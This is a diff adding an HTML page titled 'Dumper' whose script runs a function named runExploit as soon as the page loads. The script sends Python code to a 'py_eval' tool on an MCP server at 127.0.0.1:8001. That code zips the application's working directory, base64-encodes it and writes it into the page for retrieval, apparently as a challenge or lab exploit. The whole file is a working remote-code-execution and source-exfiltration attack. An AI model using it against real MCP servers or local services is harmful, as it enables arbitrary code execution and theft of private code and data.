@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Dumper</title>
+</head>
+
+<body>
+    <script>
+        async function runExploit() {
+            // Python code to zip everything and base64 encode it
+            // We skip /proc, /sys, /dev, /run etc to avoid infinite loops or errors
+            // And limit size just in case? No, let's grab the app dir.
+            // Assumption: App is in /app or current working directory.
+            const cmd = `
+import os, zipfile, io, base64
+
+buffer = io.BytesIO()
+z = zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED)
+
+# Determine root to dump. '.' is reliable for the app code.
+# Or use os.getcwd()
+start_dir = '.' 
+
+for root, dirs, files in os.walk(start_dir):
+    for file in files:
+        if file.endswith('.pyc') or file.startswith('.'): continue
+        file_path = os.path.join(root, file)
+        try:
+            z.write(file_path, arcname=os.path.relpath(file_path, start_dir))
+        except: pass
+
+z.close()
+res = base64.b64encode(buffer.getvalue()).decode()
+`;
+
+            const payload = {
+                "params": {
+                    "name": "py_eval",
+                    "arguments": { "code": cmd }
+                }
+            };
+
+            try {
+                const response = await fetch("http://127.0.0.1:8001/mcp", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+
+                const jsonResp = await response.json();
+
+                try {
+                    const textPayload = jsonResp.result.content[0].text;
+                    const evalResult = JSON.parse(textPayload);
+
+                    document.open();
+                    document.write("|||RESULT_START|||" + evalResult.result + "|||RESULT_END|||");
+                    document.close();
+                } catch (parseError) {
+                    document.body.innerText = "Error: " + parseError;
+                }
+
+            } catch (error) {
+                document.body.innerText = "Fetch Error: " + error.toString();
+            }
+        }
+        runExploit();
+    </script>
+</body>
+
+</html>
